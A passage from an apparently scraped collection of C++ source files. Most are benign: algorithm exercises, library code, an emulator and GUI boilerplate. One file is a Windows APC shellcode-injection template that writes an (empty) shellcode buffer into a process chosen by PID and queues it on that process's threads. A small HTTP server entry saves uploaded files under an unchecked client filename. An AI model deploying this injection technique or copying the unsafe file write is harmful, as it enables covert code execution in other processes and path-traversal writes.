{\npublic:\n    vector<int> sumZero(int n) {\n        vector<int> nums(n, 0);\n        if (n % 2) {\n            for (int i = 1; i <= n / 2; i++) {\n                nums[n / 2 + i] = i;\n                nums[n / 2 - i] = (-1) * i;\n            }\n        } else {\n            for (int i = 1; i <= n / 2; i++) {\n                nums[n / 2 + i - 1] = i;\n                nums[n / 2 - i] = (-1) * i;\n            }\n        }\n        return nums;\n    }\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"inf_scroll_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nconst int MAXV = 20;\nstruct MaTranKe {\n\tint mtk[MAXV][MAXV];\n\tint n;\n};\n\n//Ham doc ma tran ke tu file van ban\nbool docMaTran(const char* file, MaTranKe& maTran) {\n\tFILE* filePointer = fopen(file, \"rt\");\n\tif (filePointer == NULL) return false;\n\tfscanf(filePointer, \"%d\", &maTran.n);\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tfscanf(filePointer, \"%d\", &maTran.mtk[i][j]);\n\t\t}\n\t}\n\tfclose(filePointer);\n\treturn true;\n}\n\n//Ham xuat ma tran ke\nvoid inMaTran(MaTranKe maTran) {\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tcout << endl;\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tcout << maTran.mtk[i][j] << \" \";\n\t\t}\n\t}\n}\n\n\n//Ham tra ve so canh cua do thi \nint demSoCanh(MaTranKe maTran) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tif (maTran.mtk[i][j] != 0)\n\t\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tinh bac ra cua dinh u trong do thi\nint soBacRa(MaTranKe maTran, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] != 0) {\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tim canh co trong so V lon nhat cua dinh U\nint timCanhLonNhatCuaDinh(MaTranKe maTran, int u, int& v) {\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] > v) {\n\t\t\tv = maTran.mtk[u][i];\n\t\t}\n\t}\n\treturn v;\n}\n\nint main() {\n\tMaTranKe maTran;\n\tif (docMaTran(\"MaTranKe.txt\", maTran) == true) {\n\t\tcout << \"Ma tran co: \";\n\t\tinMaTran(maTran);\n\t\tcout << \"\\nSo canh cua do thi: \" << demSoCanh(maTran);\n\t}\n\telse \n\t\tcout << \"\\nKhong doc duoc ma tran.\" << endl;\n\n\tint u;\n\tcout << \"\\n\\nNhap bac muon kiem tra so bac ra: \"; cin >> u;\n\tcout << \"Bac cua \"<< u << \": \"  << soBacRa(maTran, u);\n\n\tint x, v = 0;\n\tcout << \"\\n\\nNhap bac muon tim canh co trong so lon nhat: \"; cin >> x;\n\tcout << \"Canh co trong so lon nhat cua \" << x << \" la: \" << timCanhLonNhatCuaDinh(maTran, x, v);\n\n\treturn 0;\n}",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 Kurt Konolige\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"types_sba.h\"\n#include <iostream>\n\nnamespace g2o {\n\n  using namespace std;\n\n\n  VertexSBAPointXYZ::VertexSBAPointXYZ() : BaseVertex<3, Vector3d>()\n  {\n  }\n\n  bool VertexSBAPointXYZ::read(std::istream& is)\n  {\n    Vector3d lv;\n    for (int i=0; i<3; i++)\n      is >> _estimate[i];\n    return true;\n  }\n\n  bool VertexSBAPointXYZ::write(std::ostream& os) const\n  {\n    Vector3d lv=estimate();\n    for (int i=0; i<3; i++){\n      os << lv[i] << \" \";\n    }\n    return os.good();\n  }\n\n} // end namespace\n",
    "/**\n * Project Reactor\n */\n\n\n#include \"Reactor.h\"\n#include \"Task.h\"\n\n/**\n * Reactor implementation\n */\n\n\n/**\n * @param ip\n * @param port\n * @param timeout\n * @param threadNum\n * @param qSize\n */\nReactor::Reactor(size_t threadNum, size_t qSize, const string& ip, unsigned short port, int timeout)\n:_pool(threadNum,qSize)\n,_server(ip,port,timeout)\n{}\n\n/**\n * @param ip\n * @param port\n * @param timeout\n * @param threadNum\n * @param qSize\n */\nReactor::Reactor(size_t threadNum, size_t qSize, const string& ip, const string& port, int timeout)\n:_pool(threadNum,qSize)\n,_server(ip,port,timeout)\n{}\n\nReactor::~Reactor() {\n    _pool.stop();\n}\n\n/**\n * @return void\n */\nvoid Reactor::start() {\n    _pool.start();\n    using namespace std::placeholders;\n    _server.setAllCallback(std::bind(&Reactor::onNewConn,this,_1),\n                           std::bind(&Reactor::onMessage,this,_1),\n                           std::bind(&Reactor::onClose,this,_1));\n    _server.start();\n}\n\n/**\n * @return void\n */\nvoid Reactor::stop() {\n    _server.stop();\n}\n\n/**\n * @param con\n * @return void\n */\nvoid Reactor::onNewConn(TcpConnectionPtr con) {\n    /* cout << con->toString() << \" is connecting!\\n\"; */\n    LogInfo(con->toString() + \" is connecting!\");\n}\n\n/**\n * @param con\n * @return void\n */\nvoid Reactor::onMessage(TcpConnectionPtr con) {\n    string msg = con->recv();\n    /* cout << \"recv cmd = \" << msg << \"\\n\"; */\n    if(msg.size() && msg[0] == '1'){\n        /* msg = con->recv(); */\n        // \u53bb\u9664\u672b\u5c3e\u7684\u6362\u884c\n        if(msg.back() == '\\n'){\n            msg.resize(msg.size()-1);\n        }\n        LogInfo(\"recv cmd = KeyWord, msg = \" + msg);\n        _pool.addTask(shared_ptr<Task>(new KeyWordTask(msg,con)));\n    }\n    else if(msg.size() && msg[0] == '2'){\n        /* msg = con->recv(); */\n        // \u53bb\u9664\u672b\u5c3e\u7684\u6362\u884c\n        if(msg.back() == '\\n'){\n            msg.resize(msg.size()-1);\n        }\n        LogInfo(\"recv cmd = WebQuery, msg = \" + msg);\n        _pool.addTask(shared_ptr<Task>(new WebQueryTask(msg,con)));\n    }\n    else{\n        _pool.addTask(shared_ptr<Task>(new Task(\"Task Msg Error!\",con)));\n    }\n}\n\n/**\n * @param con\n * @return void\n */\nvoid Reactor::onClose(TcpConnectionPtr con) {\n    /* cout << con->toString() << \" is closed!!!\\n\"; */\n    LogInfo(con->toString() + \" is closed!!!\");\n}\n\n",
    "#include \"../cpu.h\"\n#include \"../../common/defs.h\"\n#include \"../../memory/memory.h\"\n\n#include <stdexcept>\n\nNUM_CYCLES CPU::opcode0x3F()\n{\n    if (registers.flags.getFlag(FlagTypes::CARRY))\n    {\n        registers.flags.lowerFlag(FlagTypes::CARRY);\n    }\n    else\n    {\n        registers.flags.raiseFlag(FlagTypes::CARRY);\n    }\n    registers.flags.lowerFlag(FlagTypes::ADDSUB);\n    registers.flags.lowerFlag(FlagTypes::HALF_CARRY);\n    return 1;\n} // CCF (C = !C)\n\nNUM_CYCLES CPU::opcode0x37()\n{\n    registers.flags.raiseFlag(FlagTypes::CARRY);\n    registers.flags.lowerFlag(FlagTypes::ADDSUB);\n    registers.flags.lowerFlag(FlagTypes::HALF_CARRY);\n    return 1;\n} // SCF (C = 1)\n\nNUM_CYCLES CPU::opcode0x00()\n{\n    return 1;\n} // NOP\n\nNUM_CYCLES CPU::opcode0x76()\n{\n    halted = true;\n    return 1;\n} // HALT\n\nNUM_CYCLES CPU::opcode0x10()\n{\n    return 1;\n} // STOP\n\nNUM_CYCLES CPU::opcode0xF3()\n{\n    registers.ime = false;\n    return 1;\n} // DI (Disable interrupts)\n\nNUM_CYCLES CPU::opcode0xFB()\n{\n    registers.ime = true;\n    return 1;\n} // EI\n\n",
    "// can_address.cpp\n//\n// --------------------------------------------------------------------------\n// This file is part of the \"sockpp\" C++ socket library.\n//\n// Copyright (c) 2014-2021 Frank Pagliughi\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// 1. Redistributions of source code must retain the above copyright notice,\n// this list of conditions and the following disclaimer.\n//\n// 2. Redistributions in binary form must reproduce the above copyright\n// notice, this list of conditions and the following disclaimer in the\n// documentation and/or other materials provided with the distribution.\n//\n// 3. Neither the name of the copyright holder nor the names of its\n// contributors may be used to endorse or promote products derived from this\n// software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n// PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n// --------------------------------------------------------------------------\n\n#include \"sockpp/can_address.h\"\n\n#include <net/if.h>\n#include <sys/ioctl.h>\n\n#include <cstring>\n#include <stdexcept>\n\n#include \"sockpp/socket.h\"\n\nusing namespace std;\n\nnamespace sockpp {\n\n/////////////////////////////////////////////////////////////////////////////\n\nconstexpr sa_family_t can_address::ADDRESS_FAMILY;\n\n// --------------------------------------------------------------------------\n\ncan_address::can_address(unsigned idx) noexcept {\n    addr_.can_family = ADDRESS_FAMILY;\n    addr_.can_ifindex = idx;\n}\n\ncan_address::can_address(const string& iface) {\n    unsigned idx = ::if_nametoindex(iface.c_str());\n\n    if (idx == 0)\n        throw system_error{result<>::last_error()};\n\n    addr_.can_family = ADDRESS_FAMILY;\n    addr_.can_ifindex = idx;\n}\n\nresult<can_address> can_address::create(const std::string& iface) {\n    unsigned idx = ::if_nametoindex(iface.c_str());\n\n    if (idx == 0)\n        return error_code{errno, system_category()};\n\n    sockaddr_can addr{};\n    addr.can_family = ADDRESS_FAMILY;\n    addr.can_ifindex = idx;\n    return can_address{addr};\n}\n\nresult<string> can_address::get_iface() const noexcept {\n    if (addr_.can_family == AF_UNSPEC)\n        return string{};\n\n    if (addr_.can_ifindex == 0)\n        return string{\"any\"};\n\n    char buf[IF_NAMESIZE];\n    const char* iface = if_indextoname(addr_.can_ifindex, buf);\n\n    if (!iface)\n        return error_code{errno, system_category()};\n\n    return string{iface};\n}\n\n// --------------------------------------------------------------------------\n\nstring can_address::iface() const noexcept {\n    if (addr_.can_family == AF_UNSPEC)\n        return string{};\n\n    if (addr_.can_ifindex == 0)\n        return string{\"any\"};\n\n    char buf[IF_NAMESIZE];\n    const char* iface = if_indextoname(addr_.can_ifindex, buf);\n\n    return string{iface ? iface : \"unknown\"};\n}\n\n// --------------------------------------------------------------------------\n\nostream& operator<<(ostream& os, const can_address& addr) {\n    os << \"can:\" << addr.iface();\n    return os;\n}\n\n/////////////////////////////////////////////////////////////////////////////\n// End namespace sockpp\n}  // namespace sockpp\n",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <cstring>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <vector>\n#include <thread>\n#include <fstream>\n#include <sstream>\n\nstd::string captureAfterKey(const std::string& input) {\n    std::size_t echoPos = input.find(\"/echo/\");\n    if (echoPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 /echo/\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u4ece /echo/ \u540e\u9762\u5f00\u59cb\u67e5\u627e\u7a7a\u683c\n    std::size_t spacePos = input.find(' ', echoPos + 6); // /echo/ \u957f\u5ea6\u4e3a6\n    if (spacePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u7a7a\u683c\uff0c\u53d6\u4ece /echo/ \u540e\u9762\u5230\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u90e8\u5206\n        return input.substr(echoPos + 6);\n    } else {\n        // \u5982\u679c\u627e\u5230\u4e86\u7a7a\u683c\uff0c\u53d6\u7a7a\u683c\u524d\u7684\u90e8\u5206\n        return input.substr(echoPos + 6, spacePos - echoPos - 6);\n    }\n}\n\nstd::string extractUserAgent(const std::string& request) {\n    std::size_t userAgentPos = request.find(\"User-Agent: \");\n    if (userAgentPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 User-Agent \u5934\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u627e\u5230 User-Agent \u5934\uff0c\u73b0\u5728\u627e\u5230\u8be5\u884c\u7684\u7ed3\u675f\u4f4d\u7f6e\n    std::size_t endOfLinePos = request.find(\"\\r\\n\", userAgentPos);\n    if (endOfLinePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u884c\u7ed3\u675f\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n    return request.substr(userAgentPos + sizeof(\"User-Agent: \") - 1, endOfLinePos - userAgentPos - sizeof(\"User-Agent: \") + 1);\n}\n\n\nint matchPath(const char *keyword[], int keywordSize, const std::string& path) {\n    for (int i = 0; i < keywordSize; ++i) {\n        if (std::strcmp(keyword[i], path.c_str()) == 0) {\n            return 1; // \u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 1\n        }\n    }\n    return 0; // \u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 0\n}\n\nint matchEcho(const std::string& path, const std::vector<std::string>& array) {\n    for (const auto& str : array) {\n        if (path.find(str) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& filePath) {\n    std::ifstream fileStream(filePath, std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content;\n        content.resize(size);\n        if (size > 0) {\n            fileStream.read(&content[0], size);\n        }\n        return content;\n    } else {\n        return \"\";\n    }\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& directory, const std::string& filename) {\n    std::ifstream fileStream((directory + \"/\" + filename).c_str(), std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());\n        return content;\n    } else {\n        return \"\";\n    }\n}\nstd::string handlePostRequest(const std::string& request, const std::string& directory) {\n    std::string response;\n    std::string filename;\n    std::string fileContent;\n\n    // \u67e5\u627e POST \u8bf7\u6c42\u6b63\u6587\u7684\u5f00\u59cb\n    size_t postHeaderEnd = request.find(\"\\r\\n\\r\\n\") + 4;\n    if (postHeaderEnd != std::string::npos) {\n        // \u83b7\u53d6 POST \u8bf7\u6c42\u6b63\u6587\u5185\u5bb9\n        fileContent = request.substr(postHeaderEnd);\n\n        // \u63d0\u53d6\u6587\u4ef6\u540d\uff0c\u5047\u8bbe\u5b83\u7d27\u8ddf\u5728 \"POST /files/\" \u4e4b\u540e\n        size_t filenameStart = request.find(\"POST /files/\") + 11;\n        size_t filenameEnd = request.find(\" \", filenameStart); // \u5047\u8bbe\u6587\u4ef6\u540d\u4e4b\u540e\u6709\u4e00\u4e2a\u7a7a\u683c\n        if (filenameEnd != std::string::npos) {\n            filename = request.substr(filenameStart, filenameEnd - filenameStart);\n\n            // \u6784\u9020\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\n            std::string filePath = directory + \"/\" + filename;\n\n            // \u4fdd\u5b58\u6587\u4ef6\n            std::ofstream outFile(filePath, std::ios::binary);\n            if (outFile) {\n                outFile << fileContent;\n                response = \"HTTP/1.1 201 Created\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            } else {\n                response = \"HTTP/1.1 500 Internal Server Error\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            }\n        } else {\n            response = \"HTTP/1.1 400 Bad Request: Invalid filename\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n        }\n    } else {\n        response = \"HTTP/1.1 400 Bad Request: Invalid POST request format\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n    }\n\n    return response;\n}\n// \u65b0\u5efa\u51fd\u6570 processRequest \u6765\u5904\u7406\u8bf7\u6c42\nstd::string processRequest(const std::string& request, const std::string& directory, const std::vector<std::string>& keyword) {\n    std::string report;\n    size_t start_pos = request.find(\" \");\n    size_t end_pos = request.find(\" \", start_pos + 1);\n    \n    if (start_pos != std::string::npos && end_pos != std::string::npos) {\n        std::string method = request.substr(0, start_pos);\n        std::string path = request.substr(start_pos + 1, end_pos - start_pos - 1);\n        std::cout << \"Received path: \" << path << std::endl;\n        \n        // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n        std::st",
    "#include \"compiler.hpp\"\n#include \"assembler.hpp\"\n#include \"mysimpletron.hpp\"\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\n//x = 1000 in the input.txt file.......\n//if you change the constant make sure its not in three digits only two digits......\n\n\n\nint main() {\n    std::ifstream inputFile(\"input.txt\");\n    std::ofstream assemblyFile(\"assembly.txt\", std::ios::out | std::ios::trunc);\n    std::ofstream machineCodeFile(\"machine_code.txt\", std::ios::out | std::ios::trunc);\n\n    if (!inputFile.is_open()) {\n        std::cerr << \"Error opening input file.\\n\";\n        return 1;\n    }\n\n    // Read entire input file into a string\n    std::string code((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());\n    inputFile.close();\n\n    Compiler compiler;\n    Assembler assembler;\n\n    // Compile the code into initial assembly\n    auto assembly = compiler.compile(code);\n\n    // Write the updated assembly code to a file\n    for (const auto& line : assembly) {\n        assemblyFile << line << std::endl;\n    }\n    assemblyFile.close();\n\n    // Assemble the updated assembly into machine code\n    auto machineCode = assembler.assemble(assembly);\n\n    // Write machine code to a file\n    for (const auto& line : machineCode) {\n        machineCodeFile << line << std::endl;\n    }\n    machineCodeFile.close();\n\n    // Open machine code file for execution\n    std::ifstream machineCodeInput(\"machine_code.txt\");\n    if (!machineCodeInput.is_open()) {\n        std::cerr << \"Error opening machine code file.\\n\";\n        return 1;\n    }\n\n    // Read the machine code from the file\n    Simpletron simpletron(100);\n    std::vector<int> program;\n    std::string machineLine;\n    while (getline(machineCodeInput, machineLine)) {\n        if (!machineLine.empty()) {\n            program.push_back(std::stoi(machineLine));\n        }\n    }\n    machineCodeInput.close();\n\n    // Load and execute the updated machine code in the Simpletron\n    simpletron.load_program(program);\n    simpletron.execute();\n\n    // Optionally, dump the final state of the Simpletron\n    simpletron.dump();\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcID);\n\nint main()\n{\n\tDWORD dwProcList[1024];\n\tDWORD dwBytesWritten;\n\tDWORD dwOldProtect = 0;\n\tHANDLE hProc;\n\tSIZE_T bytesWritten;\n\tint PID, counter = 0;\n\tchar cProcName[100];\n\tunsigned char shellcode[] = \"\";\n\n\tprintf(\"Type PID: \");\n\tscanf_s(\"%d\", &PID);\n    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);\n\n    while(counter < (dwBytesWritten / 4)) {\n\t\thProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);\n        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {\n\t\t\tif (dwProcList[counter] == PID) {\n\t\t\t\tprintf(\"PROCCESS NAME - %s\\n\", cProcName);\n\t\t\t\tLPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);\n\t\t\t\tWriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);\n\t\t\t\tVirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);\n\t\t\t\tRunAPC(pVirtualMem,dwProcList[counter]);\n\t\t\t}\n            CloseHandle(hProc);\n        }\n\t\tcounter++;\n    }\n}\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcId) {\n\tTHREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV\n\n\tif (hSnapshot == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"Error Openning the function\");\n\t\tCloseHandle(hSnapshot);\n\t}\n\n\tfor (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {\n\t\tif (thEntry.th32OwnerProcessID == iProcId) {\n\t\t\tHANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);\n\t\t\tprintf(\"PROC [%d] ThreadID: %d\\n\", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);\n\t\t\tQueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);\n\t\t}\n\t}\n\tCloseHandle(hSnapshot);\n}\n",
    "//\ufd3e\u0625\u0650\u0646\u0651\u064e\u0645\u064e\u0627 \u064a\u064e\u062e\u0652\u0634\u064e\u0649 \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0645\u0650\u0646\u0652 \u0639\u0650\u0628\u064e\u0627\u062f\u0650\u0647\u0650 \u0627\u0644\u0652\u0639\u064f\u0644\u064e\u0645\u064e\u0627\u0621\u064f \u0625\u0650\u0646\u0651\u064e \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0639\u064e\u0632\u0650\u064a\u0632\u064c \u063a\u064e\u0641\u064f\u0648\u0631\u064c\ufd3f\n#include <bits/stdc++.h>\n#define int long long\n//#define endl \"\\n \"\nusing namespace std;\n/*\n<-----Complexity Analysis----->\n-Space Complexity: O(1)\n-Time Complexity: O(N^2)\n*/\nint FindMinIndex(int a[], int i, int j)\n{\n    if (i == j)\n        return i;\n \n    // Find minimum of remaining\n    int k = FindMinIndex(a, i + 1, j);\n \n    // Return minimum of current and remaining\n    return (a[i] < a[k])? i : k;\n}\n \n// Recursive selection sort. n is size of array and index\n// is index of starting element.\nvoid RSelectionSort(int a[], int n, int index = 0)\n{\n    // Return when starting and size are same\n    if (index == n)\n       return;\n \n    // calling minimum index function for minimum index\n    int k = FindMinIndex(a, index, n-1);\n \n    // Swapping when index and minimum index are not same\n    if (k != index)\n       swap(a[k], a[index]);\n \n    // Recursively calling selection sort function\n    RSelectionSort(a, n, index + 1);\n}\n\nvoid printArray(int arr[], int size)\n{\n    int i;\n    for (i = 0; i < size; i++) {\n        cout << arr[i] << \" \";\n    }\n  cout << endl;\n}\n\nsigned main() {\nint arr[3] = {3 ,1 ,2};\n    RSelectionSort(arr,sizeof(arr)/sizeof(arr[0]));\n    printArray(arr,sizeof(arr)/sizeof(arr[0]));\n}\n",
    "\ufeff\n// MyTestDlg.cpp: \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"MyTest.h\"\n#include \"MyTestDlg.h\"\n#include \"afxdialogex.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// \u7528\u4e8e\u5e94\u7528\u7a0b\u5e8f\u201c\u5173\u4e8e\u201d\u83dc\u5355\u9879\u7684 CAboutDlg \u5bf9\u8bdd\u6846\n\nclass CAboutDlg : public CDialogEx\n{\npublic:\n\tCAboutDlg();\n\n// \u5bf9\u8bdd\u6846\u6570\u636e\n#ifdef AFX_DESIGN_TIME\n\tenum { IDD = IDD_ABOUTBOX };\n#endif\n\n\tprotected:\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \u652f\u6301\n\n// \u5b9e\u73b0\nprotected:\n\tDECLARE_MESSAGE_MAP()\n};\n\nCAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)\n{\n}\n\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n}\n\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\nEND_MESSAGE_MAP()\n\n\n// CMyTestDlg \u5bf9\u8bdd\u6846\n\n\n\nCMyTestDlg::CMyTestDlg(CWnd* pParent /*=nullptr*/)\n\t: CDialogEx(IDD_MYTEST_DIALOG, pParent)\n\t, m_time(_T(\"\"))\n{\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\n}\n\nvoid CMyTestDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialogEx::DoDataExchange(pDX);\n\tDDX_Text(pDX, IDC_EDIT1, m_time);\n}\n\nBEGIN_MESSAGE_MAP(CMyTestDlg, CDialogEx)\n\tON_WM_SYSCOMMAND()\n\tON_WM_PAINT()\n\tON_WM_QUERYDRAGICON()\n\tON_WM_TIMER()\n\tON_BN_CLICKED(IDC_BUTTON1, &CMyTestDlg::OnBnClickedButton1)\n\tON_BN_CLICKED(IDC_BUTTON2, &CMyTestDlg::OnBnClickedButton2)\n\tON_WM_DESTROY()\nEND_MESSAGE_MAP()\n\n\n// CMyTestDlg \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\n\nBOOL CMyTestDlg::OnInitDialog()\n{\n\tCDialogEx::OnInitDialog();\n\n\t// \u5c06\u201c\u5173\u4e8e...\u201d\u83dc\u5355\u9879\u6dfb\u52a0\u5230\u7cfb\u7edf\u83dc\u5355\u4e2d\u3002\n\n\t// IDM_ABOUTBOX \u5fc5\u987b\u5728\u7cfb\u7edf\u547d\u4ee4\u8303\u56f4\u5185\u3002\n\tASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\n\tASSERT(IDM_ABOUTBOX < 0xF000);\n\n\tCMenu* pSysMenu = GetSystemMenu(FALSE);\n\tif (pSysMenu != nullptr)\n\t{\n\t\tBOOL 